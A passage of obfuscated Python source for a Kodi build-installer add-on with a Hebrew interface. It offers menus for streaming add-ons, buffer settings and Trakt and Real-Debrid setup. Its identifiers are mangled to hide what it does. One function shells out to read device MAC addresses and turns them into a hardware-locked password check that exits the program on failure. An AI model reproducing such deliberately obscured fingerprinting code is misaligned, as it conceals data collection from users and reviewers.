						if OO000OOO00O0000O0 .rfind (O00O000000O0OO0OO ,1 )>-1 :#line:1706
							OO000OOO00O0000O0 =OO000OOO00O0000O0 [1 :OO000OOO00O0000O0 .rfind (O00O000000O0OO0OO )]#line:1707
					else :#line:1708
						if OO000OOO00O0000O0 .find (" ")>0 :#line:1709
							OO000OOO00O0000O0 =OO000OOO00O0000O0 [:OO000OOO00O0000O0 .find (" ")]#line:1710
						elif OO000OOO00O0000O0 .find ("/")>0 :#line:1711
							OO000OOO00O0000O0 =OO000OOO00O0000O0 [:OO000OOO00O0000O0 .find ("/")]#line:1712
						elif OO000OOO00O0000O0 .find (">")>0 :#line:1713
							OO000OOO00O0000O0 =OO000OOO00O0000O0 [:OO000OOO00O0000O0 .find (">")]#line:1714
					O00000OO0OOOOO0O0 .append (OO000OOO00O0000O0 .strip ())#line:1716
			O0OOO00O0O00OO0OO =O00000OO0OOOOO0O0 #line:1717
		else :#line:1718
			O00000OO0OOOOO0O0 =[]#line:1719
			for OOOOOOO0OO000000O in O0OOO00O0O00OO0OO :#line:1720
				OOOOO0OOO00O0OO00 =u"</"+name #line:1721
				OOOOO0O0O00OO000O =OO00O0O0OOOO0O0O0 .find (OOOOOOO0OO000000O )#line:1723
				O0OOOO000O00O0O00 =OO00O0O0OOOO0O0O0 .find (OOOOO0OOO00O0OO00 ,OOOOO0O0O00OO000O )#line:1724
				O00O000OO0O00OO0O =OO00O0O0OOOO0O0O0 .find ("<"+name ,OOOOO0O0O00OO000O +1 )#line:1725
				while O00O000OO0O00OO0O <O0OOOO000O00O0O00 and O00O000OO0O00OO0O !=-1 :#line:1727
					O00O000OO0O0OO0OO =OO00O0O0OOOO0O0O0 .find (OOOOO0OOO00O0OO00 ,O0OOOO000O00O0O00 +len (OOOOO0OOO00O0OO00 ))#line:1728
					if O00O000OO0O0OO0OO !=-1 :#line:1729
						O0OOOO000O00O0O00 =O00O000OO0O0OO0OO #line:1730
					O00O000OO0O00OO0O =OO00O0O0OOOO0O0O0 .find ("<"+name ,O00O000OO0O00OO0O +1 )#line:1731
				if OOOOO0O0O00OO000O ==-1 and O0OOOO000O00O0O00 ==-1 :#line:1733
					O0O00O0OOO00000O0 =u""#line:1734
				elif OOOOO0O0O00OO000O >-1 and O0OOOO000O00O0O00 >-1 :#line:1735
					O0O00O0OOO00000O0 =OO00O0O0OOOO0O0O0 [OOOOO0O0O00OO000O +len (OOOOOOO0OO000000O ):O0OOOO000O00O0O00 ]#line:1736
				elif O0OOOO000O00O0O00 >-1 :#line:1737
					O0O00O0OOO00000O0 =OO00O0O0OOOO0O0O0 [:O0OOOO000O00O0O00 ]#line:1738
				elif OOOOO0O0O00OO000O >-1 :#line:1739
					O0O00O0OOO00000O0 =OO00O0O0OOOO0O0O0 [OOOOO0O0O00OO000O +len (OOOOOOO0OO000000O ):]#line:1740
				if ret :#line:1742
					OOOOO0OOO00O0OO00 =OO00O0O0OOOO0O0O0 [O0OOOO000O00O0O00 :OO00O0O0OOOO0O0O0 .find (">",OO00O0O0OOOO0O0O0 .find (OOOOO0OOO00O0OO00 ))+1 ]#line:1743
					O0O00O0OOO00000O0 =OOOOOOO0OO000000O +O0O00O0OOO00000O0 +OOOOO0OOO00O0OO00 #line:1744
				OO00O0O0OOOO0O0O0 =OO00O0O0OOOO0O0O0 [OO00O0O0OOOO0O0O0 .find (O0O00O0OOO00000O0 ,OO00O0O0OOOO0O0O0 .find (OOOOOOO0OO000000O ))+len (O0O00O0OOO00000O0 ):]#line:1746
				O00000OO0OOOOO0O0 .append (O0O00O0OOO00000O0 )#line:1747
			O0OOO00O0O00OO0OO =O00000OO0OOOOO0O0 #line:1748
		O000O0O0000O00O00 +=O0OOO00O0O00OO0OO #line:1749
	return O000O0O0000O00O00 #line:1751
def addItem (OO00O0O0000O000O0 ,OOOO0O0O00O00O00O ,O0O00O0O00OOO00OO ,O00O00O00OO00OOO0 ,O00OO00000OOOOOOO ,description =None ):#line:1753
	if description ==None :description =''#line:1754
	description ='[COLOR white]'+description +'[/COLOR]'#line:1755
	O0O0OO0000OOO000O =sys .argv [0 ]+"?url="+urllib .quote_plus (OOOO0O0O00O00O00O )+"&mode="+str (O0O00O0O00OOO00OO )+"&name="+urllib .quote_plus (OO00O0O0000O000O0 )+"&iconimage="+urllib .quote_plus (O00O00O00OO00OOO0 )+"&fanart="+urllib .quote_plus (O00OO00000OOOOOOO )#line:1756
	OOO0OOO0O00OOOO0O =True #line:1757
	O0000OO0000O0OOO0 =xbmcgui .ListItem (OO00O0O0000O000O0 ,iconImage =O00O00O00OO00OOO0 ,thumbnailImage =O00O00O00OO00OOO0 )#line:1758
	O0000OO0000O0OOO0 .setInfo (type ="Video",infoLabels ={"Title":OO00O0O0000O000O0 ,"Plot":description })#line:1759
	O0000OO0000O0OOO0 .setProperty ("fanart_Image",O00OO00000OOOOOOO )#line:1760
	O0000OO0000O0OOO0 .setProperty ("icon_Image",O00O00O00OO00OOO0 )#line:1761
	OOO0OOO0O00OOOO0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O0OO0000OOO000O ,listitem =O0000OO0000O0OOO0 ,isFolder =False )#line:1762
	return OOO0OOO0O00OOOO0O #line:1763
def get_params ():#line:1765
		OO00OOOOO00O0OO00 =[]#line:1766
		OOO0O000OOO000O00 =sys .argv [2 ]#line:1767
		if len (OOO0O000OOO000O00 )>=2 :#line:1768
				O0OOOOO0O00000OO0 =sys .argv [2 ]#line:1769
				O0O00O0O00000OO00 =O0OOOOO0O00000OO0 .replace ('?','')#line:1770
				if (O0OOOOO0O00000OO0 [len (O0OOOOO0O00000OO0 )-1 ]=='/'):#line:1771
						O0OOOOO0O00000OO0 =O0OOOOO0O00000OO0 [0 :len (O0OOOOO0O00000OO0 )-2 ]#line:1772
				O00O0OO0000000000 =O0O00O0O00000OO00 .split ('&')#line:1773
				OO00OOOOO00O0OO00 ={}#line:1774
				for O0OO0O0O000OO0O0O in range (len (O00O0OO0000000000 )):#line:1775
						O00000000OOO0OO0O ={}#line:1776
						O00000000OOO0OO0O =O00O0OO0000000000 [O0OO0O0O000OO0O0O ].split ('=')#line:1777
						if (len (O00000000OOO0OO0O ))==2 :#line:1778
								OO00OOOOO00O0OO00 [O00000000OOO0OO0O [0 ]]=O00000000OOO0OO0O [1 ]#line:1779
		return OO00OOOOO00O0OO00 #line:1781
def decode (OOO0000O00OO00O0O ,O00OO00O0OO00OO0O ):#line:1786
    import base64 #line:1787
    O0O0OO0OO0O00OOO0 =[]#line:1788
    if (len (OOO0000O00OO00O0O ))!=4 :#line:1790
     return 10 #line:1791
    O00OO00O0OO00OO0O =base64 .urlsafe_b64decode (O00OO00O0OO00OO0O )#line:1792
    for O00OOOO00O0O000OO in range (len (O00OO00O0OO00OO0O )):#line:1794
        O0000O0O0O00OO00O =OOO0000O00OO00O0O [O00OOOO00O0O000OO %len (OOO0000O00OO00O0O )]#line:1795
        OO00000OO0000OO00 =chr ((256 +ord (O00OO00O0OO00OO0O [O00OOOO00O0O000OO ])-ord (O0000O0O0O00OO00O ))%256 )#line:1796
        O0O0OO0OO0O00OOO0 .append (OO00000OO0000OO00 )#line:1797
    return "".join (O0O0OO0OO0O00OOO0 )#line:1798
def tmdb_list (O0O000OO0OOOO0O00 ):#line:1799
    O0O0O0O0O0O0O00O0 =decode ("7643",O0O000OO0OOOO0O00 )#line:1802
    return int (O0O0O0O0O0O0O00O0 )#line:1805
def u_list (O0O0OOO0O0O00O0OO ):#line:1806
    from math import sqrt #line:1808
    O0O0O0OO0O0O00O00 =tmdb_list (TMDB_NEW_API )#line:1809
    O0OOOO0O00O00O0O0 =str ((getHwAddr ('eth0'))*O0O0O0OO0O0O00O00 )#line:1811
    OOO0O00OOO0O0O0O0 =int (O0OOOO0O00O00O0O0 [1 ]+O0OOOO0O00O00O0O0 [2 ]+O0OOOO0O00O00O0O0 [5 ]+O0OOOO0O00O00O0O0 [7 ])#line:1812
    O000O0OOO0OO00O0O =(ADDON .getSetting ("pass"))#line:1814
    OO00OOOOO0O0OO00O =(str (round (sqrt ((OOO0O00OOO0O0O0O0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1819
    if '.'in OO00OOOOO0O0OO00O :#line:1820
     OO00OOOOO0O0OO00O =(str (round (sqrt ((OOO0O00OOO0O0O0O0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1821
    if O000O0OOO0OO00O0O ==OO00OOOOO0O0OO00O :#line:1823
      O000O000O00O00OOO =O0O0OOO0O0O00O0OO #line:1825
    else :#line:1827
       if STARTP2 ()and STARTP ()=='ok':#line:1828
         return O0O0OOO0O0O00O0OO #line:1831
       O000O000O00O00OOO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1832
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1833
       sys .exit ()#line:1834
    return O000O000O00O00OOO #line:1835
def disply_hwr ():#line:1838
   try :#line:1839
    OO0OOO0OOOOOOO0OO =tmdb_list (TMDB_NEW_API )#line:1840
    OO0O0O0O0O0O00OO0 =str ((getHwAddr ('eth0'))*OO0OOO0OOOOOOO0OO )#line:1841
    O0O00O0O000OOOO00 =(OO0O0O0O0O0O00OO0 [1 ]+OO0O0O0O0O0O00OO0 [2 ]+OO0O0O0O0O0O00OO0 [5 ]+OO0O0O0O0O0O00OO0 [7 ])#line:1848
    OOOO00OOO0OOO00OO =(ADDON .getSetting ("action"))#line:1849
    wiz .setS ('action',str (O0O00O0O000OOOO00 ))#line:1851
   except :pass #line:1852
def disply_hwr2 ():#line:1853
   try :#line:1854
    OO00O0O00OO0O0O00 =tmdb_list (TMDB_NEW_API )#line:1855
    O0OO0OO0O0OOO0OOO =str ((getHwAddr ('eth0'))*OO00O0O00OO0O0O00 )#line:1857
    O00OOOO00OOOO0O0O =(O0OO0OO0O0OOO0OOO [1 ]+O0OO0OO0O0OOO0OOO [2 ]+O0OO0OO0O0OOO0OOO [5 ]+O0OO0OO0O0OOO0OOO [7 ])#line:1866
    OOOOO0000OO0OOO00 =(ADDON .getSetting ("action"))#line:1867
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O00OOOO00OOOO0O0O )#line:1870
   except :pass #line:1871
def getHwAddr (OOOOO0OO0OO000O0O ):#line:1873
   import subprocess ,time #line:1874
   O0OOO0O0O00O0O000 ='windows'#line:1875
   if xbmc .getCondVisibility ('system.platform.android'):#line:1876
       O0OOO0O0O00O0O000 ='android'#line:1877
   if xbmc .getCondVisibility ('system.platform.android'):#line:1878
     OO00O000OO0OO000O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1879
     O0O0OO00OO0OOO000 =re .compile ('link/ether (.+?) brd').findall (str (OO00O000OO0OO000O ))#line:1881
     O00O00O00OOOO0OO0 =0 #line:1882
     for OOOO0000000O00O00 in O0O0OO00OO0OOO000 :#line:1883
      if O0O0OO00OO0OOO000 !='00:00:00:00:00:00':#line:1884
          OOO0000OO0000O00O =OOOO0000000O00O00 #line:1885
          O00O00O00OOOO0OO0 =O00O00O00OOOO0OO0 +int (OOO0000OO0000O00O .replace (':',''),16 )#line:1886
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1888
       O0O00O0O000000OO0 =0 #line:1889
       O00O00O00OOOO0OO0 =0 #line:1890
       OO00O00OO000O000O =[]#line:1891
       OO0OO000O0O000000 =os .popen ("getmac").read ()#line:1892
       OO0OO000O0O000000 =OO0OO000O0O000000 .split ("\n")#line:1893
       for OO000O0000O000O00 in OO0OO000O0O000000 :#line:1895
            O00OOOOO0O0O00O00 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO000O0000O000O00 ,re .I )#line:1896
            if O00OOOOO0O0O00O00 :#line:1897
                O0O0OO00OO0OOO000 =O00OOOOO0O0O00O00 .group ().replace ('-',':')#line:1898
                OO00O00OO000O000O .append (O0O0OO00OO0OOO000 )#line:1899
                O00O00O00OOOO0OO0 =O00O00O00OOOO0OO0 +int (O0O0OO00OO0OOO000 .replace (':',''),16 )#line:1902
   else :#line:1904
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1905
   try :#line:1922
    return O00O00O00OOOO0OO0 #line:1923
   except :pass #line:1924
def getpass ():#line:1925
	disply_hwr2 ()#line:1927
def setpass ():#line:1928
    OOOO00OO00O00O00O =xbmcgui .Dialog ()#line:1929
    O0O0OOO0O000OO00O =''#line:1930
    O0O0000O000O0OOOO =xbmc .Keyboard (O0O0OOO0O000OO00O ,'הכנס סיסמה')#line:1932
    O0O0000O000O0OOOO .doModal ()#line:1933
    if O0O0000O000O0OOOO .isConfirmed ():#line:1934
           O0O0000O000O0OOOO =O0O0000O000O0OOOO .getText ()#line:1935
    wiz .setS ('pass',str (O0O0000O000O0OOOO ))#line:1936
def setuname ():#line:1937
    O0OOO0O00O0O000OO =''#line:1938
    OOO000OO0O00O0O00 =xbmc .Keyboard (O0OOO0O00O0O000OO ,'הכנס שם משתמש')#line:1939
    OOO000OO0O00O0O00 .doModal ()#line:1940
    if OOO000OO0O00O0O00 .isConfirmed ():#line:1941
           O0OOO0O00O0O000OO =OOO000OO0O00O0O00 .getText ()#line:1942
           wiz .setS ('user',str (O0OOO0O00O0O000OO ))#line:1943
def powerkodi ():#line:1944
    os ._exit (1 )#line:1945
def buffer1 ():#line:1947
	OO0O0O0O0O00O000O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1948
	O0O00O0OOO0O00OO0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1949
	O00OO000O00000O0O =xbmc .getInfoLabel ("System.FreeMemory")#line:1950
	O0O0000OOO0O0000O =re .sub ('[^0-9]','',O00OO000O00000O0O )#line:1951
	O0O0000OOO0O0000O =int (O0O0000OOO0O0000O )/3 #line:1952
	OO000OO0000O00O0O =O0O0000OOO0O0000O *1024 *1024 #line:1953
	try :OOOO0O000OO0O0O00 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1954
	except :OOOO0O000OO0O0O00 =16 #line:1955
	O00OOOOO00O0O000O =DIALOG .yesno ('FREE MEMORY: '+str (O00OO000O00000O0O ),'Based on your free Memory your optimal buffersize is: '+str (O0O0000OOO0O0000O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1958
	if O00OOOOO00O0O000O ==1 :#line:1959
		with open (OO0O0O0O0O00O000O ,"w")as OOO0OOO000OO0OOO0 :#line:1960
			if OOOO0O000OO0O0O00 >=17 :OO000000OOO0000OO =xml_data_advSettings_New (str (OO000OO0000O00O0O ))#line:1961
			else :OO000000OOO0000OO =xml_data_advSettings_old (str (OO000OO0000O00O0O ))#line:1962
			OOO0OOO000OO0OOO0 .write (OO000000OOO0000OO )#line:1964
			DIALOG .ok ('Buffer Size Set to: '+str (OO000OO0000O00O0O ),'Please restart Kodi for settings to apply.','')#line:1965
	elif O00OOOOO00O0O000O ==0 :#line:1967
		OO000OO0000O00O0O =_O0OOOOOOOOOO0OOO0 (default =str (OO000OO0000O00O0O ),heading ="INPUT BUFFER SIZE")#line:1968
		with open (OO0O0O0O0O00O000O ,"w")as OOO0OOO000OO0OOO0 :#line:1969
			if OOOO0O000OO0O0O00 >=17 :OO000000OOO0000OO =xml_data_advSettings_New (str (OO000OO0000O00O0O ))#line:1970
			else :OO000000OOO0000OO =xml_data_advSettings_old (str (OO000OO0000O00O0O ))#line:1971
			OOO0OOO000OO0OOO0 .write (OO000000OOO0000OO )#line:1972
			DIALOG .ok ('Buffer Size Set to: '+str (OO000OO0000O00O0O ),'Please restart Kodi for settings to apply.','')#line:1973
def xml_data_advSettings_old (OO0O0OOOO0O00O00O ):#line:1974
	OOO000OO0O0O00O00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0O0OOOO0O00O00O #line:1984
	return OOO000OO0O0O00O00 #line:1985
def xml_data_advSettings_New (O0O00O0O0OO00OOO0 ):#line:1987
	OO000O000OO0OOO00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0O00O0O0OO00OOO0 #line:1999
	return OO000O000OO0OOO00 #line:2000
def write_ADV_SETTINGS_XML (O0OOOO0O00OO00O00 ):#line:2001
    if not os .path .exists (xml_file ):#line:2002
        with open (xml_file ,"w")as O0O00O0O0OO0O0O00 :#line:2003
            O0O00O0O0OO0O0O00 .write (xml_data )#line:2004
def _O0OOOOOOOOOO0OOO0 (default ="",heading ="",hidden =False ):#line:2005
    ""#line:2006
    OOOO0O00OOO00000O =xbmc .Keyboard (default ,heading ,hidden )#line:2007
    OOOO0O00OOO00000O .doModal ()#line:2008
    if (OOOO0O00OOO00000O .isConfirmed ()):#line:2009
        return unicode (OOOO0O00OOO00000O .getText (),"utf-8")#line:2010
    return default #line:2011
def index ():#line:2013
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2014
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2015
	if AUTOUPDATE =='Yes':#line:2016
		if wiz .workingURL (WIZARDFILE )==True :#line:2017
			O0OOOOOO0000O0O0O =wiz .checkWizard ('version')#line:2018
			if O0OOOOOO0000O0O0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0OOOOOO0000O0O0O ),'wizardupdate',themeit =THEME2 )#line:2019
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2020
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2021
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2022
	if len (BUILDNAME )>0 :#line:2023
		O0O00O00OOO00O0OO =wiz .checkBuild (BUILDNAME ,'version')#line:2024
		OOO0O0OO000000000 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2025
		if O0O00O00OOO00O0OO >BUILDVERSION :OOO0O0OO000000000 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OOO0O0OO000000000 ,O0O00O00OOO00O0OO )#line:2026
		addDir (OOO0O0OO000000000 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2028
		try :#line:2030
		     OO0000OOO000OOO00 =wiz .themeCount (BUILDNAME )#line:2031
		except :#line:2032
		   OO0000OOO000OOO00 =False #line:2033
		if not OO0000OOO000OOO00 ==False :#line:2034
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2035
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2036
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2039
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2040
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2041
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2045
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2047
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2049
def morsetup ():#line:2051
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2052
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2053
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2054
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2055
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2056
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2060
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2061
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2064
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2065
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2075
	setView ('files','viewType')#line:2076
def morsetup2 ():#line:2077
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2078
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2079
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2080
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2081
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2082
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2083
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2084
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2085
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2086
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2087
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2088
def fastupdate ():#line:2089
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2090
def forcefastupdate ():#line:2092
			OO0OO0OO0O0O0O0OO ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2093
			wiz .ForceFastUpDate (ADDONTITLE ,OO0OO0OO0O0O0O0OO )#line:2094
def rdsetup ():#line:2098
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2099
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2100
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2102
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2103
def traktsetup ():#line:2106
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2107
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2108
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2109
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2110
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2111
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2112
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2113
	setView ('files','viewType')#line:2114
def setautorealdebrid ():#line:2115
    from resources .libs import real_debrid #line:2116
    OO0OO0O00OO0OOO00 =real_debrid .RealDebridFirst ()#line:2117
    OO0OO0O00OO0OOO00 .auth ()#line:2118
def setrealdebrid ():#line:2120
    OO000O0O0OO0O0OOO =(ADDON .getSetting ("auto_rd"))#line:2121
    if OO000O0O0OO0O0OOO =='false':#line:2122
       ADDON .openSettings ()#line:2123
    else :#line:2124
        from resources .libs import real_debrid #line:2125
        OO0O0O00OO00O0000 =real_debrid .RealDebrid ()#line:2126
        OO0O0O00OO00O0000 .auth ()#line:2127
        rdon ()#line:2130
def resolveurlsetup ():#line:2132
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2133
def urlresolversetup ():#line:2134
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2135
def placentasetup ():#line:2137
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2138
def reptiliasetup ():#line:2139
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2140
def flixnetsetup ():#line:2141
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2142
def yodasetup ():#line:2143
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2144
def numberssetup ():#line:2145
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2146
def uranussetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2148
def genesissetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2150
def net_tools (view =None ):#line:2152
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2153
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2154
	setView ('files','viewType')#line:2156
def speedMenu ():#line:2157
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2158
def viewIP ():#line:2159
	O0OO000O0OO0O0O0O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2173
	O000O00OO000O0O0O =[];O0O000OOO00OOO0OO =0 #line:2174
	for OO0OOOOOOOOOO0O00 in O0OO000O0OO0O0O0O :#line:2175
		OO0O00OOOOO00OOOO =wiz .getInfo (OO0OOOOOOOOOO0O00 )#line:2176
		OOOOOOOO00OO00O0O =0 #line:2177
		while OO0O00OOOOO00OOOO =="Busy"and OOOOOOOO00OO00O0O <10 :#line:2178
			OO0O00OOOOO00OOOO =wiz .getInfo (OO0OOOOOOOOOO0O00 );OOOOOOOO00OO00O0O +=1 ;wiz .log ("%s sleep %s"%(OO0OOOOOOOOOO0O00 ,str (OOOOOOOO00OO00O0O )));xbmc .sleep (1000 )#line:2179
		O000O00OO000O0O0O .append (OO0O00OOOOO00OOOO )#line:2180
		O0O000OOO00OOO0OO +=1 #line:2181
	OO00OOOO0O000OO00 ,OO00OOOO0O0OOOO00 ,O0O000O0O0O0OOO0O =getIP ()#line:2182
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OO000O0O0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2183
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOO0O000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2184
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOO0O0OOOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2185
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O0O0O0OOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2186
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OO000O0O0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2187
	setView ('files','viewType')#line:2188
def buildMenu ():#line:2190
	if USERNAME =='':#line:2191
		ADDON .openSettings ()#line:2192
		sys .exit ()#line:2193
	if PASSWORD =='':#line:2194
		ADDON .openSettings ()#line:2195
	OOO00O0OO0O000O0O =u_list (SPEEDFILE )#line:2196
	(OOO00O0OO0O000O0O )#line:2197
	OOO000OOO00OOO0OO =(wiz .workingURL (OOO00O0OO0O000O0O ))#line:2198
	(OOO000OOO00OOO0OO )#line:2199
	OOO000OOO00OOO0OO =wiz .workingURL (SPEEDFILE )#line:2200
